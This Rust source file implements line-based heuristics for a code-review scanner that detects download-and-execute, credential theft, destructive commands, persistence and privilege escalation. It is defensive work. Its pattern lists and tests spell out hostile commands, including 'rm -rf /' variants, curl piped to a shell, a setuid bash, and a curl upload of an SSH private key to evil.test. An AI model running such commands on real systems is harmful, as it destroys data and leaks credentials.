//! Local, line-oriented heuristics.
//!
//! Every rule is a `RuleId` variant with a `Matcher`, so adding a rule without
//! deciding how it matches is a compile error rather than a silent miss.

use std::net::IpAddr;
use std::path::Path;

use crate::report::Severity;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RuleId {
    DownloadAndExecute,
    EncodedCommandExecution,
    CredentialFileAccess,
    DestructiveSystemOperation,
    PersistenceModification,
    ShellCommandExecution,
    PrivilegeEscalation,
    CredentialExfiltration,
    CleartextNetworkRequest,
    DirectIpNetworkRequest,
    DisabledTlsVerification,
}

/// How a rule decides whether a lowercased line matches.
enum Matcher {
    /// Any of these patterns, respecting identifier boundaries (see
    /// `contains_pattern`).
    Patterns(&'static [&'static str]),
    Custom(fn(&str) -> bool),
    /// Reported from the network destination inventory instead of per line.
    NetworkInventory,
}

const CREDENTIAL_FILES: &[&str] = &[
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".aws/credentials",
    ".config/gcloud/credentials.db",
    "/etc/shadow",
    "login data",
    "cookies.sqlite",
];

const ENCODED_PIPES: &[&str] = &[
    "base64 -d | sh",
    "base64 --decode | sh",
    "base64 -d | bash",
    "base64 --decode | bash",
];

const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "mkfs.",
    "shred /dev/",
    "dd if=/dev/zero of=/dev/",
    "dd if=/dev/urandom of=/dev/",
    "--no-preserve-root",
];

const PERSISTENCE_PATHS: &[&str] = &[
    ".config/autostart/",
    ".config/systemd/user/",
    ".config/environment.d/",
    "/etc/systemd/system/",
    "/etc/cron.",
    "/etc/rc.local",
    "/etc/ld.so.preload",
    "/etc/profile.d/",
    "crontab -",
    ".ssh/authorized_keys",
    ".bashrc",
    ".zshrc",
    "/library/launchagents/",
    "currentversion\\run",
];

const SHELL_EXECUTION: &[&str] = &[
    "os.system(",
    "os.execute(",
    "io.popen(",
    "subprocess.popen(",
    "subprocess.run(",
    "child_process.exec(",
    "child_process.execsync(",
    "command::new(\"sh\")",
    "command::new(\"bash\")",
    "eval(",
];

const PRIVILEGE_ESCALATION: &[&str] = &[
    "sudo ",
    "pkexec ",
    "setuid(",
    "chmod u+s",
    "chmod 4755",
    "setcap ",
    "cap_set_file",
    "/etc/sudoers",
    "usermod -ag",
    "chown root",
];

const DISABLED_TLS: &[&str] = &[
    "--insecure",
    "--no-check-certificate",
    "insecureskipverify: true",
    "rejectunauthorized: false",
    "node_tls_reject_unauthorized=0",
    "verify=false",
    "cert_none",
];

impl RuleId {
    pub const ALL: [Self; 11] = [
        Self::DownloadAndExecute,
        Self::EncodedCommandExecution,
        Self::CredentialFileAccess,
        Self::DestructiveSystemOperation,
        Self::PersistenceModification,
        Self::ShellCommandExecution,
        Self::PrivilegeEscalation,
        Self::CredentialExfiltration,
        Self::CleartextNetworkRequest,
        Self::DirectIpNetworkRequest,
        Self::DisabledTlsVerification,
    ];

    pub const fn name(self) -> &'static str {
        match self {
            Self::DownloadAndExecute => "download-and-execute",
            Self::EncodedCommandExecution => "encoded-command-execution",
            Self::CredentialFileAccess => "credential-file-access",
            Self::DestructiveSystemOperation => "destructive-system-operation",
            Self::PersistenceModification => "persistence-modification",
            Self::ShellCommandExecution => "shell-command-execution",
            Self::PrivilegeEscalation => "privilege-escalation",
            Self::CredentialExfiltration => "credential-exfiltration",
            Self::CleartextNetworkRequest => "cleartext-network-request",
            Self::DirectIpNetworkRequest => "direct-ip-network-request",
            Self::DisabledTlsVerification => "disabled-tls-verification",
        }
    }

    pub const fn severity(self) -> Severity {
        match self {
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::CredentialExfiltration => Severity::High,
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::ShellCommandExecution
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification => Severity::Medium,
        }
    }

    pub const fn description(self) -> &'static str {
        match self {
            Self::DownloadAndExecute => {
                "Downloads are piped directly into a shell; inspect the remote script before running it."
            }
            Self::EncodedCommandExecution => {
                "Encoded or dynamically evaluated data appears to be executed as a command."
            }
            Self::CredentialFileAccess => {
                "References a commonly sensitive credential or private-key file; inspect how it is used."
            }
            Self::DestructiveSystemOperation => {
                "Contains a command associated with destructive disk or filesystem changes."
            }
            Self::PersistenceModification => {
                "May install persistence through a startup, scheduled-task, or SSH authorization file."
            }
            Self::ShellCommandExecution => {
                "Starts a shell or dynamically evaluates a command; review how input is constructed."
            }
            Self::PrivilegeEscalation => {
                "Requests elevated privileges or changes privilege-related system configuration."
            }
            Self::CredentialExfiltration => {
                "Combines access to sensitive data with an outbound network request."
            }
            Self::CleartextNetworkRequest => "Sends a network request over unencrypted HTTP.",
            Self::DirectIpNetworkRequest => {
                "Sends a request to a hard-coded IP address instead of a named host."
            }
            Self::DisabledTlsVerification => {
                "Disables TLS certificate verification for network requests."
            }
        }
    }

    const fn matcher(self) -> Matcher {
        match self {
            Self::DownloadAndExecute => Matcher::Custom(is_download_piped_to_shell),
            Self::EncodedCommandExecution => Matcher::Custom(is_encoded_command_execution),
            Self::CredentialFileAccess => Matcher::Patterns(CREDENTIAL_FILES),
            Self::DestructiveSystemOperation => Matcher::Custom(is_destructive_operation),
            Self::PersistenceModification => Matcher::Patterns(PERSISTENCE_PATHS),
            Self::ShellCommandExecution => Matcher::Patterns(SHELL_EXECUTION),
            Self::PrivilegeEscalation => Matcher::Custom(is_privilege_escalation),
            Self::CredentialExfiltration => Matcher::Custom(looks_like_credential_exfiltration),
            Self::CleartextNetworkRequest | Self::DirectIpNetworkRequest => {
                Matcher::NetworkInventory
            }
            Self::DisabledTlsVerification => Matcher::Patterns(DISABLED_TLS),
        }
    }

    /// Context rules that describe something a script might do, which
    /// install notes routinely tell the user to do by hand (`sudo systemctl
    /// enable ...`, `add this to ~/.bashrc`). They skip text a script only
    /// prints. The rules for directly dangerous commands still match printed
    /// text, so a message cannot hide one.
    pub const fn ignores_messages(self) -> bool {
        match self {
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification => true,
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::ShellCommandExecution
            | Self::CredentialExfiltration => false,
        }
    }

    fn matches_line(self, lowered: &str) -> bool {
        match self.matcher() {
            Matcher::Patterns(patterns) => contains_any(lowered, patterns),
            Matcher::Custom(matches) => matches(lowered),
            Matcher::NetworkInventory => false,
        }
    }
}

/// The line rules matched by one lowercased line: `code` with comments
/// blanked, `quiet` with printed messages blanked as well (see `mask`).
pub fn line_rules<'a>(code: &'a str, quiet: &'a str) -> impl Iterator<Item = RuleId> + 'a {
    RuleId::ALL
        .into_iter()
        .filter(move |rule| rule.matches_line(if rule.ignores_messages() { quiet } else { code }))
}

fn is_identifier_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// Finds `pattern` in `haystack`. A pattern that starts with an identifier
/// character must not continue an identifier or member access, so `eval(`
/// matches `eval(x)` but not `retrieval(x)` or `model.eval()`.
fn contains_pattern(haystack: &str, pattern: &str) -> bool {
    let needs_boundary = pattern.bytes().next().is_some_and(is_identifier_byte);
    haystack.match_indices(pattern).any(|(start, _)| {
        !needs_boundary
            || haystack.as_bytes()[..start]
                .last()
                .is_none_or(|previous| !is_identifier_byte(*previous) && *previous != b'.')
    })
}

fn contains_any(haystack: &str, patterns: &[&str]) -> bool {
    patterns
        .iter()
        .any(|pattern| contains_pattern(haystack, pattern))
}

pub fn is_download_piped_to_shell(line: &str) -> bool {
    if !line.contains("curl") && !line.contains("wget") {
        return false;
    }
    line.split('|').skip(1).any(|command| {
        let command = command.trim_start();
        ["sh", "bash", "zsh"].iter().any(|shell| {
            command
                .strip_prefix(shell)
                .is_some_and(|rest| rest.is_empty() || rest.starts_with([' ', '\t']))
        })
    })
}

fn is_encoded_command_execution(line: &str) -> bool {
    contains_any(line, ENCODED_PIPES) || is_encoded_data_executed(line)
}

pub fn is_encoded_data_executed(line: &str) -> bool {
    let decodes_data =
        line.contains("base64.b64decode(") || line.contains("[convert]::frombase64string");
    let executes_data = ["exec(", "eval(", "os.system(", "invoke-expression", "iex "]
        .iter()
        .any(|pattern| line.contains(pattern));
    decodes_data && executes_data
}

fn is_privilege_escalation(line: &str) -> bool {
    match without_chrome_sandbox_setuid(line) {
        Some(rest) => contains_any(&rest, PRIVILEGE_ESCALATION),
        None => contains_any(line, PRIVILEGE_ESCALATION),
    }
}

/// The line with every `chmod 4755` / `chmod u+s` of a lone `chrome-sandbox`
/// removed, or `None` when it has none. Chromium and Electron apps
/// (Brave, Chrome, 1Password, Obsidian, ...) ship this helper and need it
/// setuid root to sandbox their renderers, so their packages always do this.
/// Any other privilege change on the line still matches.
fn without_chrome_sandbox_setuid(line: &str) -> Option<String> {
    let tokens: Vec<&str> = line.split_whitespace().collect();
    let mut kept = Vec::with_capacity(tokens.len());
    let mut exempted = false;
    let mut index = 0;
    while index < tokens.len() {
        let is_setuid = tokens[index] == "chmod"
            && matches!(tokens.get(index + 1), Some(&("4755" | "u+s")))
            && tokens.get(index + 2).is_some_and(|target| {
                target
                    .trim_end_matches(';')
                    .trim_matches(['"', '\''])
                    .rsplit('/')
                    .next()
                    == Some("chrome-sandbox")
            })
            && tokens.get(index + 3).is_none_or(|next| {
                matches!(*next, "||" | "&&" | ";" | "|") || tokens[index + 2].ends_with(';')
            });
        if is_setuid {
            exempted = true;
            index += 3;
        } else {
            kept.push(tokens[index]);
            index += 1;
        }
    }
    exempted.then(|| kept.join(" "))
}

fn is_destructive_operation(line: &str) -> bool {
    contains_any(line, DESTRUCTIVE_COMMANDS) || removes_root_or_home(line)
}

/// Recursive `rm` of `/`, `/*`, `~` or `$HOME` itself. Removing paths below
/// them (`rm -rf /tmp/build`, `rm -rf "$pkgdir"`) is ordinary build hygiene.
pub fn removes_root_or_home(line: &str) -> bool {
    let tokens: Vec<&str> = line.split_whitespace().collect();

    tokens.iter().enumerate().any(|(index, token)| {
        let command = token.trim_start_matches(['(', '`', '{']);
        if command != "rm" && !command.ends_with("/rm") {
            return false;
        }

        let mut arguments = Vec::new();
        for argument in &tokens[index + 1..] {
            if matches!(*argument, ";" | "&&" | "||" | "|" | "&") {
                break;
            }
            arguments.push(*argument);
            if argument.ends_with([';', '&', '|']) {
                break;
            }
        }
        let recursive = arguments.iter().any(|argument| {
            *argument == "--recursive"
                || argument
                    .strip_prefix('-')
                    .is_some_and(|flags| !flags.starts_with('-') && flags.contains('r'))
        });

        recursive
            && arguments
                .iter()
                .filter(|argument| !argument.starts_with('-'))
                .any(|argument| {
                    let target = argument
                        .trim_end_matches([';', ')', '`'])
                        .trim_matches(['"', '\'']);
                    is_root_or_home(target)
                })
    })
}

fn is_root_or_home(target: &str) -> bool {
    let base = target.trim_end_matches(['/', '*']);
    (target.starts_with('/') && base.is_empty()) || matches!(base, "~" | "$home" | "${home}")
}

pub fn looks_like_credential_exfiltration(line: &str) -> bool {
    let sends_data = [
        "curl ",
        "wget ",
        "fetch(",
        "requests.post(",
        "axios.post(",
        ".post(",
        ".put(",
        "http.post(",
        "http.request(",
        "upload(",
        "socket.send(",
        "websocket",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    if !sends_data {
        return false;
    }

    let reads_secret_variable = [
        "process.env",
        "os.environ",
        "getenv(",
        "cookie",
        "authorization",
        "password",
        "secret",
        "api_key",
        "token",
    ]
    .iter()
    .any(|pattern| line.contains(pattern));
    let reads_sensitive_file = contains_any(line, CREDENTIAL_FILES)
        && [
            " -d @",
            "--data @",
            "--data-binary @",
            "-f @",
            "open(",
            "readfile(",
            "read_file(",
            "read_to_string(",
            "readtext(",
            "read_text(",
            "read_bytes(",
        ]
        .iter()
        .any(|pattern| line.contains(pattern));

    reads_secret_variable || reads_sensitive_file
}

/// Names of prose files, matched as a prefix followed by the end of the name
/// or `.`, `-` or `_`: `LICENSE`, `LICENSE.txt`, `COPYING.LESSER`,
/// `eula_text.html`.
const PROSE_NAMES: &[&str] = &[
    "readme",
    "license",
    "licence",
    "copying",
    "changelog",
    "authors",
    "notice",
    "eula",
];

/// Prose files are sent to the AI review but not matched by the local
/// command rules, where install instructions (`sudo pacman -S ...`) and
/// examples would otherwise block every project with a README.
pub fn is_documentation(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    if matches!(
        extension.as_str(),
        "md" | "markdown" | "rst" | "adoc" | "asciidoc" | "org"
    ) {
        return true;
    }

    // License texts: by name, or anywhere under a REUSE-style `LICENSES/`.
    let prose_name = PROSE_NAMES.iter().any(|prose| {
        name.strip_prefix(prose)
            .is_some_and(|rest| rest.is_empty() || rest.starts_with(['.', '-', '_']))
    });
    let in_licenses = path.parent().is_some_and(|parent| {
        parent.components().any(|component| {
            component.as_os_str().to_str().is_some_and(|name| {
                matches!(name.to_ascii_lowercase().as_str(), "licenses" | "licences")
            })
        })
    });
    // A script or config named like a license still runs.
    let prose_extension =
        matches!(extension.as_str(), "html" | "htm") || !is_executable_or_runtime_config(rel);
    (prose_name || in_licenses) && prose_extension
}

/// Files whose URLs are likely to be requested when the software runs.
pub fn is_executable_or_runtime_config(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    matches!(
        extension.as_str(),
        "bash"
            | "bat"
            | "c"
            | "cc"
            | "cmd"
            | "cpp"
            | "cs"
            | "cjs"
            | "conf"
            | "css"
            | "desktop"
            | "ex"
            | "exs"
            | "fish"
            | "go"
            | "h"
            | "html"
            | "hpp"
            | "ini"
            | "java"
            | "json"
            | "js"
            | "jsx"
            | "kt"
            | "lua"
            | "mjs"
            | "php"
            | "pl"
            | "ps1"
            | "py"
            | "pyw"
            | "rb"
            | "rs"
            | "scala"
            | "sc"
            | "service"
            | "sh"
            | "svg"
            | "swift"
            | "toml"
            | "ts"
            | "tsx"
            | "xml"
            | "yaml"
            | "yml"
    ) || matches!(
        name.as_str(),
        "dockerfile"
            | "makefile"
            | "pkgbuild"
            | ".install"
            | ".bashrc"
            | ".zshrc"
            | ".profile"
            | ".bash_profile"
            | ".zprofile"
            | ".xprofile"
            | "package.json"
    )
}

/// Whether a relative path looks like it holds credentials. The check uses
/// the path inside the reviewed tree, so where the tree itself lives (for
/// example under `~/secrets/`) does not matter.
pub fn is_sensitive_path(rel: &str) -> bool {
    let lower = rel.to_lowercase();
    let name = lower.rsplit('/').next().unwrap_or_default();

    lower.split('/').any(|component| {
        matches!(
            component,
            ".ssh" | ".aws" | ".gnupg" | "credentials" | "secrets"
        )
    }) || name == ".env"
        || name.starts_with(".env.")
        || name.starts_with(".env_")
        || ["secret", "credential"]
            .iter()
            .any(|word| name.contains(word))
        || name
            .split(|character: char| !character.is_ascii_alphanumeric())
            .any(|word| word == "token" || word == "tokens")
        || [".pem", ".key", ".p12", ".pfx", ".keystore"]
            .iter()
            .any(|extension| name.ends_with(extension))
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Scheme {
    Http,
    Https,
}

impl Scheme {
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Http => "http",
            Self::Https => "https",
        }
    }
}

/// Literal HTTP(S) destinations in a line, reduced to scheme and host so
/// paths, queries and credentials in URLs are never echoed.
pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
    let lower = line.to_ascii_lowercase();
    let mut result = Vec::new();
    let mut cursor = 0;

    while cursor < lower.len() {
        let next = [("https://", Scheme::Https), ("http://", Scheme::Http)]
            .into_iter()
            .filter_map(|(prefix, scheme)| {
                lower[cursor..]
                    .find(prefix)
                    .map(|offset| (offset, prefix, scheme))
            })
            .min_by_key(|(offset, _, _)| *offset);
        let Some((offset, prefix, scheme)) = next else {
            break;
        };

        let start = cursor + offset;
        let rest = &lower[start..];
        let end = rest
            .char_indices()
            .find_map(|(index, character)| {
                (character.is_whitespace()
                    || matches!(
                        character,
                        '"' | '\'' | '`' | '<' | '>' | ')' | ']' | '}' | ',' | ';'
                    ))
                .then_some(index)
            })
            .unwrap_or(rest.len());
        let url = rest[..end]
            .get(..512)
            .unwrap_or(&rest[..end])
            .trim_end_matches(['.', ':', '?', '!', '\\']);

        if let Some(host) = url_host(&url[prefix.len().min(url.len())..])
            && !is_identifier_uri(&lower[..start])
        {
            result.push((scheme, host));
        }
        cursor = start + end.max(prefix.len());
    }

    result.sort();
    result.dedup();
    result
}

/// XML namespace, RDF and DTD URIs name a vocabulary; nothing requests them.
/// `before` is the lowercased text preceding the URL on its line.
fn is_identifier_uri(before: &str) -> bool {
    if before.contains("<!doctype") {
        return true;
    }
    let Some(before) = before.strip_suffix(['"', '\'']) else {
        return false;
    };
    let Some(attribute) = before.trim_end().strip_suffix('=') else {
        return false;
    };
    let attribute = attribute
        .trim_end()
        .rsplit(|character: char| character.is_whitespace() || character == '<')
        .next()
        .unwrap_or_default();
    attribute == "xmlns"
        || attribute.starts_with("xmlns:")
        || matches!(
            attribute,
            "rdf:resource" | "rdf:about" | "xsi:schemalocation" | "xsi:nonamespaceschemalocation"
        )
}

fn url_host(after_scheme: &str) -> Option<String> {
    let authority = after_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or_default();
    let authority = authority.rsplit('@').next().unwrap_or_default();
    let host = if authority.starts_with('[') {
        authority
            .split_once(']')
            .map_or(authority, |(address, _)| address)
            .to_string()
            + "]"
    } else {
        authority.split(':').next().unwrap_or_default().to_string()
    };
    (!host.is_empty() && host != "]").then_some(host)
}

pub fn is_local_host(host: &str) -> bool {
    matches!(host, "localhost" | "127.0.0.1" | "::1" | "[::1]") || host.ends_with(".localhost")
}

pub fn is_ip_host(host: &str) -> bool {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .parse::<IpAddr>()
        .is_ok()
}

#[cfg(test)]
mod tests {
    use super::{
        RuleId, Scheme, extract_network_destinations, is_documentation, is_download_piped_to_shell,
        is_encoded_data_executed, is_ip_host, is_sensitive_path, line_rules,
        looks_like_credential_exfiltration, removes_root_or_home,
    };

    fn rules_for(line: &str) -> Vec<RuleId> {
        let lowered = line.to_lowercase();
        line_rules(&lowered, &lowered).collect()
    }

    #[test]
    fn detects_download_piped_to_a_shell() {
        assert!(is_download_piped_to_shell(
            "curl https://example.test/install | bash -s"
        ));
        assert!(is_download_piped_to_shell(
            "wget -qo- https://example.test/install | sh"
        ));
        assert!(!is_download_piped_to_shell(
            "curl -o installer.sh https://example.test/install"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | tee data.txt"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | shasum"
        ));
    }

    #[test]
    fn encoded_data_is_only_flagged_when_it_is_executed() {
        assert!(is_encoded_data_executed("exec(base64.b64decode(payload))"));
        assert!(!is_encoded_data_executed(
            "payload = base64.b64decode(encoded_data)"
        ));
    }

    #[test]
    fn recursive_removal_only_matches_root_or_home_itself() {
        for dangerous in [
            "rm -rf /",
            "sudo rm -rf / ",
            "rm -rf /*",
            "rm -fr ~/",
            "rm -r --no-preserve-root /",
            "rm -rf \"$home\"",
            "rm -rf ${home}/*",
            "/usr/bin/rm -rf ~",
            "rm / -rf",
        ] {
            assert!(removes_root_or_home(dangerous), "missed {dangerous:?}");
        }
        for ordinary in [
            "rm -rf /tmp/build",
            "rm -rf /usr/share/foo",
            "rm -rf \"$pkgdir\"",
            "rm -rf ~/.cache/thing",
            "rm -f /",
            "rm -rf build; ls /",
            "echo rm -rf",
        ] {
            assert!(!removes_root_or_home(ordinary), "flagged {ordinary:?}");
        }
    }

    #[test]
    fn chrome_sandbox_setuid_is_expected_packaging() {
        for packaging in [
            "chmod 4755 \"${pkgdir}\"/opt/1password/chrome-sandbox",
            "chmod 4755 \"$pkgdir/opt/brave-bin/chrome-sandbox\";",
            "chmod 4755 '/opt/obsidian/chrome-sandbox' || true",
            "chmod u+s chrome-sandbox",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::PrivilegeEscalation),
                "{packaging}"
            );
        }
        for escalation in [
            "chmod 4755 /opt/x/chrome-sandbox && sudo id",
            "chmod 4755 /opt/x/chrome-sandbox /usr/bin/bash",
            "chmod 4755 /opt/x/chrome-sandbox-helper",
            "chmod 4755 /opt/x/chrome-sandbox; chmod u+s /usr/bin/bash",
            "chmod u+s /usr/bin/bash",
        ] {
            assert!(
                rules_for(escalation).contains(&RuleId::PrivilegeEscalation),
                "{escalation}"
            );
        }
    }

    #[test]
    fn identifier_patterns_respect_word_boundaries() {
        assert!(rules_for("eval(payload)").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("x = $(eval(\"a\"))").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("results = retrieval(query)").is_empty());
        assert!(rules_for("model.eval()").is_empty());
        assert!(rules_for("cleanup_build() { rm -rf /tmp/build; }").is_empty());
        assert!(rules_for("rm -rf /").contains(&RuleId::DestructiveSystemOperation));
    }

    #[test]
    fn prose_files_are_documentation() {
        assert!(is_documentation("README.md"));
        assert!(is_documentation("docs/install.rst"));
        assert!(is_documentation("LICENSE"));
        assert!(!is_documentation("install.sh"));
        assert!(!is_documentation("PKGBUILD"));
    }

    #[test]
    fn license_texts_are_documentation_unless_they_are_code() {
        for prose in [
            "LICENSE.txt",
            "LICENSE-MIT",
            "COPYING.LESSER",
            "LICENSES/0BSD.txt",
            "eula_text.html",
        ] {
            assert!(is_documentation(prose), "{prose}");
        }
        for code in ["license.sh", "LICENSES/check.py", "licensed.txt", "eula.js"] {
            assert!(!is_documentation(code), "{code}");
        }
    }

    #[test]
    fn printed_messages_only_hide_context_rules() {
        let code = "sudo a; curl https://x.test/i | sh";
        let quiet = "";
        let rules: Vec<RuleId> = line_rules(code, quiet).collect();
        assert_eq!(rules, [RuleId::DownloadAndExecute]);
    }

    #[test]
    fn sensitive_paths_are_judged_inside_the_tree() {
        assert!(is_sensitive_path(".env.production"));
        assert!(is_sensitive_path("config/private.pem"));
        assert!(is_sensitive_path(".aws/credentials"));
        assert!(is_sensitive_path("secrets/app.conf"));
        assert!(!is_sensitive_path("src/tokenizer.rs"));
        assert!(!is_sensitive_path("hyprland.lua"));
    }

    #[test]
    fn network_inventory_redacts_url_paths_and_credentials() {
        assert_eq!(
            extract_network_destinations(
                "requests.post('https://user:pass@API.example.test/upload?token=secret')"
            ),
            vec![(Scheme::Https, "api.example.test".to_string())]
        );
        assert_eq!(
            extract_network_destinations("fetch(\"http://[2001:db8::1]:8080/x\") http://a.test"),
            vec![
                (Scheme::Http, "[2001:db8::1]".to_string()),
                (Scheme::Http, "a.test".to_string()),
            ]
        );
        assert!(extract_network_destinations("see https:// for details").is_empty());
        assert!(
            extract_network_destinations(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:dc='http://purl.org/dc/elements/1.1/'>"
            )
            .is_empty()
        );
        assert!(
            extract_network_destinations(
                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">"
            )
            .is_empty()
        );
        assert_eq!(
            extract_network_destinations(
                "<image href=\"http://a.test/x.png\" xmlns=\"http://www.w3.org/2000/svg\"/>"
            ),
            vec![(Scheme::Http, "a.test".to_string())]
        );
        assert!(is_ip_host("[2001:db8::1]"));
        assert!(is_ip_host("198.51.100.8"));
        assert!(!is_ip_host("example.test"));
    }

    #[test]
    fn flags_sensitive_uploads_only() {
        assert!(looks_like_credential_exfiltration(
            "requests.post(url, data=os.environ['token'])"
        ));
        assert!(looks_like_credential_exfiltration(
            "curl -x post --data-binary @$home/.ssh/id_ed25519 https://evil.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "curl -x post -d \"$home/.ssh/id_ed25519\" https://api.example.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "requests.get(public_url)"
        ));
    }
}
